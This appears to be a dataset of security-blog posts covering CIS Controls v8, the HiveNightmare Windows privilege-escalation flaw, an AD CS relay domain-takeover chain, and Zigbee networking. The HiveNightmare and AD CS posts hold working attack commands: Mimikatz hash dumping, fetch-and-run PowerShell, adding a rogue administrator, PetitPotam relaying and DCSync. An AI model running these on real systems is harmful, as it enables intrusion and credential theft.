primary concern is to keep the business running and who have little tolerance for any downtime and/or disruption. The goal with IG1 is that the safeguards can be implemented with limited expertise, can be implemented with commercial off-the-shelf hardware and software, and are generally aimed at your run-of-the-mill, non-targeted attacks. \n\nIG2 includes all of the safeguards from IG1 but is aimed at organizations that have dedicated IT and security staff whose primary goal is to protect the organization's IT infrastructure. These organizations are usually able to tolerate short periods of downtime and/or disruption and are primarily concerned with reputational damage should a breach occur. The safeguards for IG2 will generally require enterprise-grade technology and specialized expertise in order to effectively implement these technologies. \n\nIG3 includes all of the safeguards from IG1 and IG2. Organizations at this level will usually have security staff with a specialized skillset such as Penetration Testing, Incident Response, or Digital Forensics, to name a few. These organizations are generally subject to specific regulatory or compliance requirements. The safeguards for IG3 are aimed at mitigating targeted attacks from today\u2019s sophisticated adversary. \n\nLet\u2019s dive in and take a high-level look at v8 of the CIS Controls. The first thing you will notice (aside from there now only being 18 controls) is that some of the names have changed from v7.1 and the ordering of some of the controls has changed as well. This was done to align with the \u201ctask-based grouping by activity\u201d approach that the CIS has taken with v8. \n\nControl v8 v7.1 1 Inventory and Control of Enterprise Assets Inventory and Control of Hardware Assets 2 Inventory and Control of Software Assets Inventory and Control of Software Assets 3 Data Protection Continuous Vulnerability Management 4 Secure Configuration of Enterprise Assets and Software Controlled use of Administrative Privileges 5 Account Management Secure Configurations for Hardware and Software on Mobile Devices, Laptops, Workstations, and Servers 6 Access Control Management Maintenance, Monitoring, and Analysis of Audit Logs 7 Continuous Vulnerability Management Email and Web Browser Protections 8 Audit Log Management Malware Defenses 9 Email and Web Browser Protections Limitation and Control of Network Ports, Protocols, and Services 10 Malware Defenses Data Recovery Capabilities 11 Data Recovery Secure Configuration for Network Devices, such as Firewalls, Routers, and Switches 12 Network Infrastructure Management Boundary Defense 13 Network Monitoring and Defense Data Protection 14 Security Awareness and Skills Training Controlled Access Based on the Need to Know 15 Service Provider Management Wireless Access Control 16 Application Software Security Account Monitoring and Control 17 Incident Response Management Implement a Security Awareness and Training Program 18 Penetration Testing Application Software Security 19  Incident Response and Management 20  Penetration Testing and Red Team Exercises \n\nControl 1: Inventory and Control of Enterprise Assets. \n\nThis was formerly called \u201cInventory and Control of Hardware Assets\u201d. The key to this control is that it focuses on ALL enterprise assets. This includes IoT, mobile, and those assets located within Cloud environments. The traditional network borders no longer exist and knowing what assets are in your ENTIRE environment is crucial in order to protect the organization. After all, you can\u2019t protect what you don\u2019t know exists.  \n\nControl 2: Inventory and Control of Software Assets. \n\nThe goal of this control remains unchanged from v7.1, with the intent of knowing and maintaining an inventory of all software within the organization. Like Control 1, you can\u2019t manage what you do not know exists. Having an accurate software inventory allows you to ensure ALL software is managed. And by software, we are not just referring to applications like Adobe Reader and Microsoft Office. Software also includes the Operating Systems, not just of your servers, desktops, and laptops, but also your firewalls, routers, and switches. Oh, and don\u2019t forget that Smart TV in the lunchroom.  \n\nControl 3: Data Protection \n\nThis control brings some welcome changes and extends to the data stored in the Cloud. Our physical borders no longer exist so it stands to reason that borders no longer apply to our data either. Your data is not only valuable to your organization but it\u2019s also valuable to a criminal so classifying and protecting ALL of your company data should be a high priority for any organization, that includes your data that lives in the Cloud.  \n\nControl 4: Secure Configuration of Enterprise Assets and Software.  \n\nThis is another control where non-traditional computing devices such as IoT devices have finally been taken into consideration. Not only is it critical to have secure configurations for laptops, servers, and workstations but we also need to factor in configurations for non-computing/IoT devices such as factory equipment, inventory tracking devices, and medical equipment, to name a few. Having a secure and standardized configuration significantly improves the security and reduces the management overhead of these assets. \n\nControl 5: Account Management \n\nCriminals have shifted a lot of their focus from traditional malware-based attacks to attacks against user credentials, whether in phishing attacks or utilizing stolen credentials. All accounts, including administrative and service accounts, need to be treated with the same due diligence as hardware and software-based assets. This means knowing what accounts are active and which are dormant and ensuring that no two accounts have the same password. Password re-use is a no-no and easily managed with tools such as Microsoft LAPS. \n\nControl 6: Access Control Management \n\nYou might wonder why Controls 5 and 6 are treated as separate controls. Control 5 deals with the account management itself, whereas Control 6 deals with the management of what access these accounts have. Accounts should only have the minimum level of access required in order to perform their desired function. An Identity and Access Management (IAM) solution provides the foundation for access management. Performing this manually is a tedious task and can lead to mistakes in configuration. Automating this with an IAM solution is critical to successfully implementing this control.  \n\nControl 7: Continuous Vulnerability Management \n\nThis control previously lived at the #3 spot in the Controls. Why was it moved to #7? That\u2019s a good question! You\u2019d have to ask the CIS for an official answer, but the fact is that exploiting vulnerabilities, while still important, has taken a bit of a back seat to user-based attacks, according to the 2020 Verizon Data Breach Investigations Report (DBIR). That said, this is still a never-ending game of cat and mouse, so it\u2019s important to have an effective vulnerability management program in your environment that can provide timely access to known unmanaged or unmitigated vulnerabilities within your organization. Just because it moved from #3 to #7 doesn\u2019t mean you should reduce its focus and attention.  \n\nControl 8: Audit Log Management \n\nYou wouldn\u2019t drive your car with your eyes closed, so why would you operate your infrastructure with no visibility? Without proper logging, it\u2019s very difficult to detect a potential compromise or attack. Not only will having the right logs help your Incident Response (IR) team determine what happened during an investigation, it will also aid your Security Team in detecting an attack quicker. The sooner we can discover an attack, the sooner it can be managed and the more likely it becomes that the damage can be minimized. There are generally two types of logs: System logs and Audit logs. Security incidents are not always discovered from Audit logs. In many cases, it\u2019s a sudden decrease in system performance that triggers an investigation so it\u2019s crucial that both System and Audit logs are appropriately configured for your environment.  \n\nControl 9: Email and Web Browser Protections \n\nEmail and Web Browsers are typically how your users interact with the world outside your environment. They are how a user interacts with a website or accesses their email and, as such, they\u2019re common points of entry for an adversary, not only through the use of malicious code but also through social engineering. Ensuring that appropriate protection mechanisms are in place for these tools is crucial. Things like URL filtering to restrict the types of sites a user can visit, disabling unauthorized and unvetted browser plugins, Multi-Factor Authentication (MFA), are just a few examples of things you can do to reduce the attack surface on Email and Web Browsers.  \n\nControl 10: Malware Defenses \n\nWhile malware-based attacks have fallen to #7 under the top threat action varieties according to the 2020 Verizon DBIR, cybercriminals are still attempting to entice your users to click on links or open attachments containing malware. Therefore, Malware Defenses are still a critical layer in your overall Defense in Depth Strategy. And, contrary to popular belief, Macs do get viruses, so make sure your implementation includes all Windows, Mac, and Linux-based systems in your environment.  \n\nControl 11: Data Recovery \n\nWhat good are backups if they don\u2019t work when you need them? Not only is a solid backup strategy important, it\u2019s crucial that your strategy includes the often overlooked task of performing test restores. With ransomware on the rise, it\u2019s more critical than ever that you\u2019re able to successfully restore to a pre-incident state.  \n\nControl 12: Network Infrastructure Management \n\nLike the nervous system in the human body, the network infrastructure is the backbone of your environment. As data is transmitted, it traverses through the various components that make up the network infrastructure. As such, having an accurate network diagram and ensuring that all network devices are running the latest software versions is key. Much like Control 1, if network devices or paths exist that you\u2019re unaware of, then you have a blind spot and can\u2019t realistically expect to protect all paths that an adversary could utilize.  \n\nControl 13: Network Monitoring and Defense \n\nThis control is closely related to Control 12, discussed above. Expecting your network defenses to be perfect is unrealistic, therefore continuous monitoring of your network infrastructure is crucial in order to monitor for both attacks against the network itself as well as the detection and/or prevention of lateral movement. Capabilities such as Intrusion Prevention and Intrusion Detection Systems (IDS/IPS), threat hunting, and network segmentation are just some examples of controls that will help reduce the impact of a network-based attack. \n\nControl 14: Security Awareness and Skills Training \n\nWhile it\u2019s often stated that users are your weakest link, I\u2019ve never been fond of that statement. The fact remains, however, that the human element is a critical part in the success or failure of an organization\u2019s security program. It\u2019s generally much more difficult to find an exploit than it is to manipulate a user into opening an email attachment and installing malware. According to the 2020 Verizon DBIR, phishing is the top threat action taken by adversaries to gain access to an environment. Why? Because it works! You change the oil in your car! You patch your operating systems! So why would you not \u201cmaintain and patch\u201d your users?  \n\nControl 15: Service Provider Management \n\nAs we rely more and more on vendors and other third parties to manage our data or provide infrastructure for our core applications, this is a new and welcome control. Therefore, a process to ensure these vendors are adequately protecting these platforms and data is crucial. With more and more third-party breaches occurring, a provider\u2019s security and vulnerabilities have direct consequences to your organization.  \n\nControl 16: Application Software Security \n\nThis is another control that has been extended to include Hosted environments. Software applications are the interface that allows users to interact with an application or database. As these applications become more and more complex, they are rarely created from scratch, but rather tend to be assembled from a mixture of new and existing code and libraries. Vulnerabilities, such as buffer overflows, cross-site scripting, and command injection are often utilized by adversaries as entry points into our environments. This means that our traditional approaches to security are no longer as simple as they once were because the vulnerabilities introduced along with these new complexities are not always sufficiently understood. \n\nControl 17: Incident Response Management \n\nCompanies don\u2019t usually end up on the front-page news because they were breached, but rather because the breach was poorly managed. Having an effective Incident Response plan makes all the difference between a small security incident and a full-scale front-page breach. An effective program includes protection, detection, response, and recovery capabilities. It\u2019s unreasonable to think our security protections are going to be effective 100% of the time and, statistically speaking, a security incident IS going to happen! How comprehensive your Incident Response plan is will determine the extent of the damage and whether you\u2019re front-page news or just another statistic.  \n\nControl 18: Penetration Testing \n\nIn today\u2019s complex environments with constantly evolving technologies, and ever-emerging attacker tradecraft, controlled testing of our environments is a crucial but often overlooked component of a well-rounded and comprehensive security program. Penetration Testing and Vulnerability Testing are often confused, and the terms are often misused interchangeably. Vulnerability Testing is just that, testing for known vulnerabilities, nothing more, whereas Penetration Testing takes it further and attempts to exploit these vulnerabilities and misconfigurations of systems with the desired outcome of seeing how far an attacker could get and what business processes or data would be impacted in the event an attacker was able to abuse these vulnerabilities. The ultimate goal with Penetration Testing is to discover the vulnerabilities and misconfigurations, and then remediate or mitigate them before an attacker does.  \n\nWhile the aim here was to provide a high-level overview for CIS Controls v8, a more in-depth exploration of the Controls would be a worthwhile investment for any company, especially for one looking to improve the maturity of its cybersecurity program.  \n\nA previous study found that by adopting just the first five controls, roughly 85% of attacks could be prevented while adopting all of the controls would prevent more than 97% of all attacks. So, whether you\u2019re a small chain of grocery stores, a large multi-national bank, or somewhere in between, if you\u2019re looking to bolster your security but don\u2019t know where to begin, the CIS Controls v8 is an excellent place to start. \n\nThe full details of the Controls are on the Center for Internet Security\u2019s website. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"What To Know About Microsoft's Registry Hive Flaw: #SeriousSAM\"\nTaxonomies: \"General InfoSec Tips & Tricks, Informational, InfoSec 101\"\nCreation Date: \"Fri, 30 Jul 2021 12:32:00 +0000\"\n#hivenightmare / #lolwut\n\nJeff McJunkin* //\n\nWhat is it?\n\ntl;dr -- Unpatched privilege escalation in Windows 10 in nearly all supported builds.\n\nThe vulnerability (CVE-2021\u201336934) allows an attacker with limited user code execution on Windows 10 (or 11) to gain administrative privileges locally, allowing any of the following follow-on attacks: \n\nStealing credential material for any logged-on users (via Mimikatz-style LSASS attacks) \n\nDumping and cracking cached domain credentials \n\nPersistence on the Windows 10 machine via Silver Ticket attacks\n\nWhat can we do?\n\nThere is no patch from Microsoft, but there is an available workaround:\n\nDue to weak permissions, limited users can read registry hive files at the following paths:\n\nC:\\Windows\\System32\\config\\SAM C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SAM\n\nWhich versions of Windows 10 are affected?\n\nFresh builds of Windows 10 versions 1809 and above appear to be vulnerable, though strangely fresh installations of updated Windows 10 20H1 ISO's are an exception.\n\nHow can an attacker take advantage of this flaw?\n\nAn extremely common scenario for initial access is phishing, giving an attacker control over an employee's computer (whether it's a laptop, desktop, virtual desktop, etc).\n\n``` cls :: Running as \"limiteduser\", a fresh account that is not in the Administrators group: whoami whoami /groups net user limiteduser\n\n:: This system is a fresh installation of Windows 10 1809, the oldest supported Windows 10 build ver\n\n:: Like nearly all such builds, it has the permissions flaw of allowing limited users access to registry hives: icacls C:\\Windows\\System32\\config\\SAM | findstr \"Users\"\n\n:: Set an environment variable pointing to the latest Volume Shadow Copy (enabled by default on Windows 10 with system drives >= 128GB) set directory=\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy5\\Windows\\system32\\config $directory = \"\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy5\\Windows\\system32\\config\" :: Point Mimikatz at the VSS backups and filter for the Administrator user and hash :: Other tools can do this too, or an attacker could simply exfiltrate the registry hives and use Mimikatz on their machine mimikatz \"lsadump::sam /system:%directory%\\system /sam:%directory%\\sam\" exit | findstr /c:\"User : Administrator\" /c:\"8846\" .\\mimikatz.exe \"lsadump::sam /system:$directory\\system /sam:$directory\\sam\" exit | findstr /c:\"User : Administrator\" /c:\"8846\"\n\n:: AMSI is not a defense here, or in general\n\nhttps://amsi.fail/ Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-TheHash.ps1'))\n\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://github.com/Kevin-Robertson/Invoke-TheHash/raw/master/Invoke-SMBExec.ps1'))\n\nInvoke-TheHash -Type SMBExec -Target 127.0.0.1 -Username Administrator -hash 8846f7eaee8fb117ad06bdd830b7586c -Command \"net user hacker TipYourWaiters /add\"\n\nInvoke-TheHash -Type SMBExec -Target 127.0.0.1 -Username Administrator -hash 8846f7eaee8fb117ad06bdd830b7586c -Command \"net localgroup Administrators hacker /add\"\n\n:: Compare that to the known password of 'password' -- it matches python -c \"import hashlib, binascii; print(binascii.hexlify(hashlib.new('md4','password'.encode('utf-16le')).digest()))\"\n\nicacls C:\\Windows\\System32\\config\\SAM | findstr \"Users\"\n\nvssadmin list shadows | findstr \"Original\" ```\n\nFAQ's\n\nDoes removing the Users group permissions from the registry hives fix the issue?\n\nNo, the original permissions will be kept on the Volume Shadow Copy snapshots of the filesystem (https://twitter.com/wdormann/status/1417525453116608512)\n\nDoes disabling the Volume Shadow Copy service remove all prior snapshots?\n\nNo, disabling the Volume Shadow Copy service only removes snapshots made for System Protection purposes (https://twitter.com/wdormann/status/1417547126347808774)\n\nWhich builds of Windows 10 are vulnerable by default?\n\nEssentially, any Windows 10 starting from build 1809 and above are vulnerable. Some later revisions of the Windows 10 1809 ISO's have the correct / non-vulnerable permissions, however, and those permissions are preserved with further Windows updates and upgrades to later builds. I would strongly recommend treating all supported Windows 10 builds as vulnerable\n\nSource: https://twitter.com/jeffmcjunkin/status/1417281315016122372 and https://twitter.com/gentilkiwi/status/1417484076550873089\n\nNever Waste A Crisis\n\nStart Developing Incident Response Capabilities\n\nVelociraptor scales nicely and allows both for sweeping checks for the vulnerability, along with actual remediation via Microsoft's workaround.\n\nOther incident response tools are fine if they have the following minimum capabilities: \n\nSolution scales to your number of endpoints \n\nAllows for fine-grained targeting of threat hunts and actions \n\nSupports on-prem, cloud-hosted, and devices outside the corporate network\n\n* Thanks to our friend Jeff McJunkin for sharing his knowledge with the Black Hills Information Security (BHIS) community.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Admins Nightmare: Combining HiveNightmare/SeriousSAM and AD CS Attack Paths for Profit\"\nTaxonomies: \"Author, Blue Team, How-To, Informational, InfoSec 101, Steve Borosh\"\nCreation Date: \"Fri, 06 Aug 2021 12:35:00 +0000\"\nStephan Borosh //\n\nhttps://youtu.be/7Sj2LY3_O9Y\n\nThe year of 2021 has presented some interesting challenges to securing Windows and Active Directory environments with new flaws that Microsoft has been slow to address.  \n\nIn June, @Harmj0y and @tifkin_ released some excellent research and a whitepaper discussing some potential attack paths with Active Directory Certificate Services (\u201cAD CS\u201d) (https://posts.specterops.io/certified-pre-owned-d95910965cd2). This was followed by a modified version of impacket (https://github.com/SecureAuthCorp/impacket/pull/1101) which provides the ability to relay credentials to an AD CS server and obtain a certificate for the relayed user. This certificate may then be re-used elsewhere to authenticate or elevate privileges. The following diagram displays a potential attack scenario where a user is phished and the compromised host is used as a pivot point for the AD CS relay attack. \n\nExample attack graph followed in this blog \n\nIn an attack scenario, an adversary would need to entice a remote user or system to authenticate back to the adversary-controlled host in order to relay the credential to the certificate server. The SpoolSample (https://github.com/leechristensen/SpoolSample) tool, created by @tifkin_, provides a method to invoke the MS-RPRN RPC service to entice servers via the Print Spooler to authenticate back to the adversary but, the tool requires active directory user credentials. \n\nA new tool named \u201cPetitpotam\u201d was released in a tweet by @topotam77  (https://twitter.com/topotam77/status/1416833996923809793.) This tool presents a new method for enticing a server or workstation to send a machine account hash back to the adversary. By utilizing the MS-EFSRPC protocol (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31), any user on the network may invoke a remote host to send a machine account hash, authenticated or not. \n\nIn July 2021, a tweet by @jonasLyk  (https://twitter.com/jonasLyk/status/1417205166172950531) brought to light a vulnerability that allows any user on a system to read the SAM and SYSTEM registry hives from a shadow copy if present. Combined with a utility such as Mimikatz, a user could easily obtain the local administrator password hash. With this hash, the user may be able to Pass-the-Hash and authenticate to the local computer as an administrator. For more on this vulnerability, check out https://www.blackhillsinfosec.com/what-to-know-about-microsofts-registry-hive-flaw-serioussam/. \n\nExample Attack Methodology \n\nWe start by establishing our initial access via Cobalt Strike\u2019s beacon agent.  Next, we prep the area of operations by uploading a custom Cobalt Strike launcher and the WinDivert driver packaged with the PortBender utility (https://github.com/praetorian-inc/PortBender). In this example, we use the directory C:\\Windows\\Tasks to stage. \n\nAfter preparing the environment, we can begin our attempt with CVE-2021-36934. We\u2019re going to use the tool created by @cube0x0\u2019s Github (https://github.com/cube0x0/CVE-2021-36934).  We\u2019ll use Cobalt-Strike\u2019s execute-assembly to run the .NET tool in-memory on our target host. \n\nWe have successfully dumped and parsed the hives and now a few bits of information are presented to us. The RID 500 (built-in) Administrator account has a blank password, indicating that it was initially not set. In a production environment, this would most likely be non-blank or set by Local Administrator Password Solution (\u201cLAPS\u201d). We also see some cached domain credentials that could be submitted to a password cracker to attempt to obtain clear text credentials. For our case, we\u2019ll attempt to re-use the RID 1001 account password hash against the administrator account in hopes of a password reuse finding. \n\nUtilizing the Sharp-SMBExec (https://github.com/checkymander/Sharp-SMBExec) tool by @checkymander, we can attempt to Pass-the-Hash against the local computer, attempting to elevate our privileges. \n\nWe execute the command \u201cexecute-assembly Sharp-SMBExec.exe target:localhost hash:2be54de51a5f7b3473ed0c3e1afd07a7 username:administrator command:\"cmd.exe /c c:\\windows\\tasks\\procmon.exe\" to execute our Cobalt Strike beacon payload as SYSTEM. \n\nAfter establishing a new beacon as SYSTEM, we can set up our traffic bending.  \n\nIn beacon, start a reverse port forward with rportfwd 31337 127.0.0.1 445 \n\nThis will tell the beacon agent to forward any traffic inbound to BENDERPC on port 31337, through the beacon agent, back to the team server on port 445. No need to open any firewalls on the team server as this traffic is proxied through the agent. \n\nNext, start PortBender and divert any traffic inbound to port 445 on BENDERPC to port 31337 where the rportfwd is listening. \n\nWe\u2019ll need a SOCKS proxy to proxy our relayed traffic back through the agent into the target network. \n\nWith that done, we can set up impacket to relay traffic. \n\nOn the Cobalt Strike team server, install this (https://github.com/ExAndroidDev/impacket/tree/ntlmrelayx-adcs-attack) updated version of impacket. We must clone the repository, switch branches (git checkout ntlmrelayx-adcs-attack) and then install as per impacket instructions.  \n\nWe\u2019ll also need the PetitPotam (https://github.com/topotam/PetitPotam) tool to entice the remote target to send authentication back to us via MS-EFSRPC.  \n\nWe\u2019ll want to modify the proxychains default DNS server to point to the internal DNS server of our target network. Modify the file at /usr/lib/proxychains3/proxyresolv on the team server to point to the internal DNS server as shown in the following example. If you need to enumerate the DNS server\u2019s IP address from Cobalt Strike, you can execute the following command in your beacon agent: \n\npowerpick [System.Net.Dns]::GetHostEntry(\"domain.local\")\n\nFor this attack to work properly, we need to provide the Fully Qualified Domain Name (\u201cFQDN\u201d) for the certificate server. There are a few ways to find the certificate server. If you have Remote Desktop access, you can issue the command certutil.exe -config - -ping to display the certificate server(s). You may also use a tool such as PowerView to check which groups domain computers belong to. A certificate server will belong to the \u201cCert Publishers\u201d group. \n\nIn a screen or tmux session, we can start ntlmrelayx.py with proxychains python3 ntlmrelayx.py -t https://crt.planetexpress.local/certsrv/certfnsh.asp -smb2support --adcs --template \"domaincontroller\". \n\nWith ntlmrelayx.py pointed at the certificate server through our SOCKS proxy, we can execute PetitePotam to entice the domain controller to send us its computer hash with proxychains python3 Petitpotam.py 192.168.253.140 192.168.253.135. \n\nPetitpotam initiates the authentication. We should receive a connection back. \n\nIn Cobalt Strike, we see the SMB traffic being forwarded with PortBender. \n\nGreat! We now have a valid certificate for the DC01$ machine account. We can import this into our beacon agent with the Rubeus (https://github.com/GhostPack/Rubeus) tool. By possessing the domain controller machine account hash, we can effectively become the domain controller and perform attacks such as DCSync. \n\nBack in a Cobalt Strike beacon agent (elevation not required), we execute Rubeus to pass the ticket into the session and become DC01$. \n\nexecute-assembly /home/rvrsh3ll/tools/Rubeus.exe asktgt /user:DC01$ /certificate:MII.. /ptt \n\nNow we\u2019ve successfully become the domain controller, we can perform a DCSYNC attack from Cobalt Strike.  \n\nConclusion \n\nTo recap, we started from an initial beacon agent, abused CVE-2021-36934 to escalate local privileges, diverted port 445 to our team server, enticed the domain controller to authenticate to us, relayed those credentials to the certificate server, received an authentication certificate, imported that into our beacon agent via Rubeus, and DCSYNC\u2019d the domain controller for the win. \n\nCombining these two attacks provide adversaries with a quick way to take over an Active Directory environment. Microsoft has issued mitigations for CVE-2021-36934 at https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934. Regarding AD CS, you can check out the fantastic post by SpecterOps (https://posts.specterops.io/certified-pre-owned-d95910965cd2) and PKI auditing tool at https://github.com/GhostPack/PSPKIAudit. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Understanding Zigbee and Wireless Mesh Networking\"\nTaxonomies: \"Author, Hardware Hacking, How-To, Informational, Ray Felch, Wireless\"\nCreation Date: \"Fri, 27 Aug 2021 17:34:05 +0000\"\nRay Felch //\n\nPreface:\n\nRecently, I acquired a few home automation devices, so that I might research Zigbee and get a better understanding of how this very popular wireless technology interconnects with the internet of things (IoT's) and to determine just how secure this platform really is. I was already somewhat familiar with home automation in regard to using the Bluetooth Low Energy (BLE) Mesh topology. However, major advances have been made with IoT devices, including but not limited to: connecting very low power devices (in many cases battery-powered and lasting for years), low data rates (20-250Kbits/sec) providing for more reliable communications, and self-forming and self-healing networks that grow as your needs grow.\n\nThe following document outlines my research of the Zigbee protocol and its mesh topology as it applies to small and large-scale automation. Hopefully, others might benefit from the information that I discovered along the way.\n\nUseful Hardware\n\nPreliminary preparation for my research into the Zigbee protocol consisted of getting familiar with some of the existing hardware available for analyzing and interacting with the Zigbee network. It didn't take long to find out that a very popular Zigbee sniffer was the RZRaven USB Sniffer which came with RiverLoop Security's Killerbee framework (https://github.com/riverloopsec/killerbee) pre-installed (selling for around $100). Unfortunately, after exhaustive searching, I discovered that the RZRaven has been discontinued and is nowhere to be found.\n\nReaching out to the community, I learned that another dongle existed known as the ApiMote, and it also came pre-installed with the Killerbee framework. I also found out that it was available through the Attify Store (https://www.attify-store.com/products/apimote-for-zigbee-sniffing-and-transmission) for $149. This transceiver dongle is also capable of packet injection!\n\nOther Zigbee sniffers considered were Nordic's nRF52840  (https://www.mouser.com/new/nordic-semiconductor/nordic-nrf52840-usb-dongle) and the Texas Instruments CC2531 (http://www.ti.com/tool/PACKET-SNIFFER). The TI CC2531 option also comes with an impressive GUI software application for dissecting and displaying the captured packets.\n\nI decided to go with the Api-Mote/Killerbee dongle, as well as the very inexpensive Texas Instruments CC2531 USB dongle (cost under $10).\n\nWhy Zigbee?\n\nSome may ask: \"Why Zigbee? We already have Wi-Fi and Bluetooth short-range communication standards that provide greater range and support higher data rates.\u201d While it is true that greater range and higher data rates allow for superb streaming video using Wi-Fi (and to a lesser degree, audio streaming using Bluetooth), the requirements for (Zigbee) control and sensor networks are far less demanding. Technically speaking, that is exactly why Zigbee is the better choice, as control and sensor network nodes are typically less than a few meters apart from each other, so range is hardly an issue. And communication between nodes can be established using very small packet sizes, thereby allowing very low data rates (20-250 kbps). Lower data rates and close proximity nodes yield more reliable communications (fewer retries, etc.) and work well with low power, battery-operated end-point devices, keeping costs down dramatically as the network continues to grow in size.\n\nBackground Information\n\nZigbee is an open standard wireless technology designed to facilitate low-cost, low-power wireless internet of things (IoT) networks.\n\nSpecifically, Zigbee is a low-cost, low-power, self-forming, self-healing wireless mesh network standard solution, aimed at providing wireless control and monitoring applications with an emphasis on supporting battery-powered, low data rate devices. This protocol is typically used in home automation (HA) and commercial building automation, industrial control systems, and the medical/health care industries. \n\nZigbee integrated circuits (IC's) encompass microcontrollers and radios operating in the unlicensed ISM (industrial, scientific and medical) bands: 2.4GHz for the majority of areas worldwide. There are a few devices using sub-GHz (745MHz in China, 878MHz in Europe, and 915MHz in the United States and Australia), but this is generally the exception to the rule. Zigbee uses 16 channels (11-26), 2 MHz wide with 5 MHz separation in the 2.4GHz ISM band. It should be noted that when a Zigbee network is first formed, the coordinator (hub) will scan the available channels and select the best channel to operate on (least RF interference), and only that one channel will be used going forward (no channel hopping). \n\nZigbee is an IEEE 802.15.4-based, wireless networking standard, which is basically used for two-way communication between sensors and control systems. Zigbee is a short-range wireless communication standard like Bluetooth and Wi-Fi while covering a range of 10 to 100 meters.\n\nBy creating a network of devices that can communicate with each other (in a mesh network), the 10 to 100-meter range can be extended significantly, making it extremely useful in commercial lighting and industrial control automation applications. New devices (nodes) can easily join the network (with a theoretical maximum limit of 65,000 nodes). Rerouting of communication traffic (due to failed nodes) provides a form of self-healing for the network.\n\nZigbee endpoint devices (lights, plugs, sensors, switches, thermostats, etc.) are extremely low-power and can last years on tiny batteries. Also, the fact that Zigbee is based on an open standard assures consumers and developers that devices will interoperate.\n\nBrief History\n\nZigbee has been around for a long time, initially conceived in the 1990s. The IEEE 802.15.4-2003 specification was ratified in 2004 and was made available the following year, known as the Zigbee 2004 Specification. In 2006, an upgraded specification was introduced as Zigbee 2006 Specification, replacing the 'key-value' pair structure of the 2004 stack with the Zigbee Cluster Library (ZCL). This library is composed of standardized commands and attributes organized under groups (clusters) with such names as Smart Energy, Home Automation, Zigbee Light Link, etc.\n\nIn 2007, Zigbee Pro was introduced, always maintaining backwards compatibility with the Zigbee legacy networks. Zigbee Pro devices can join legacy networks and legacy devices can join Zigbee Pro networks. However, routing options differed which resulted in a condition that Zigbee Pro devices must become non-routing Zigbee end devices (ZEDs) when on a legacy network, and legacy Zigbee devices must become ZEDs on a Zigbee Pro network.\n\nAccording to the German computer e-magazine, Heise Online, Zigbee Home Automation 1.2 (2013) is using fallback keys for encryption negotiation which are known and cannot be changed. This makes the encryption on many legacy devices highly vulnerable. Fun fact: Back then, the well-known default global trust center link key defined by the ZigBee Alliance, had a default value of 5A 69 67 42 65 65 41 6C 6C 69 61 6E 63 65 30 39 (ZigBeeAlliance09) and was used or supported by the device if no other link key is specified by the application at the time of joining. Note: Zigbee 3.0 (going forward) silently ignores the request to join the network if a device attempts to authenticate using the well-known 'ZigBeeAlliance09' trust center link key.\n\nZigbee Development Platforms\n\nEmberZNet is the implementation of Zigbee by Silicon Labs. It consists of the core Zigbee stack, Zigbee Cluster Library support, and an Application Framework. With the aid of AppBuilder in Simplicity Studio, developers can easily create a Zigbee application that can be run on one of Silicon Labs' development kits.\n\nZ-Stack is a component of the SimpleLink\u2122 CC13x2 / CC26x2 Software Development Kit. This component enables development of Zigbee\u00ae 3.0 specification-based products. Z-Stack is TI\u2019s complete solution for developing certified Zigbee 3.0 solutions on CC13x2 and CC26x2 platforms.\n\nZigbee Alliance\n\nThe Zigbee Alliance board of directors is comprised of executives from Amazon, Apple, Comcast, Google, IKEA, The Kroger Co., LEEDARSON, Legrand, Lutron Electronics, MMB Networks, NXP Semiconductors, Resideo, Schneider Electric, Signify (formerly Philips Lighting), Silicon Labs, SmartThings, Somfy, Texas Instruments, and Wulian.\n\nEstablished in 2002, the Zigbee Alliance is a group of more than 500 companies that maintain and publish the Zigbee standard. The organization publishes application profiles that allow multiple OEM vendors to create interoperable products. The relationship between IEEE 802.15.4 and Zigbee is similar to that between IEEE 802.11 and the Wi-Fi Alliance.\n\nAs of May 11, 2021, the Zigbee Alliance has been rebranded to Connectivity Standards Alliance (CSA).\n\nTECHNICAL INFORMATION\n\nZigbee Devices Types:\n\nZigbee Coordinator (ZC)\n\nZigbee Router (ZR)\n\nZigbee Endpoint Device (ZED)\n\nThe Zigbee network has exactly one Zigbee Coordinator (ZC), responsible for forming and coordinating the network. Forming includes choosing the PAN ID (personal area network identification) to identify the network and determining the physical radio channel to operate on. The coordinator is also responsible for configuring and authenticating routers and end devices that join the network. The coordinator is the Trust Center and stores all critical information about the Zigbee network, including encryption keys and link keys.\n\nThe Zigbee Router (ZR) represents intermediate nodes to assist in the relaying of data between nodes in the network. They are instrumental in the building of the Zigbee network where packets are exchanged. The Zigbee routers enhance the mesh network by increasing the range of the network (relaying packets throughout the mesh network), increasing the reliability of the packets being exchanged, and providing a means for additional nodes to join the network (with the help of the coordinator). A good example of Zigbee Router might be a smart plug (powered by a wall outlet). This device has an endless supply of main power and is, therefore, always on. The fact that this smart plug is a full-function device (FFD) makes it ideal for routing traffic and a strong candidate for becoming a parent to reduced functioning (RFD) endpoint devices.\n\nThe Zigbee Endpoint Device (ZED) are nodes that are logically attached to a Zigbee Router (ZR), and are typically devices such as lights, plugs, sensors, switches, thermostats, etc., and communicate only with the Zigbee Router (parent) that they are related to. ZED's are often battery-powered devices and sleep most of the time. They cannot communicate with other Zigbee Endpoint Devices (ZEDs) directly. In this sense, ZED's are considered Reduced Function Devices (RFD's).\n\nZED's have lower power requirements (due to active sleep mode) and can achieve long lifetimes on batteries. In contrast, ZR's and ZC's (which are always awake) have high power requirements and for this reason, cannot be battery powered.\n\nZED's are typically off (sleep mode) most of the time, 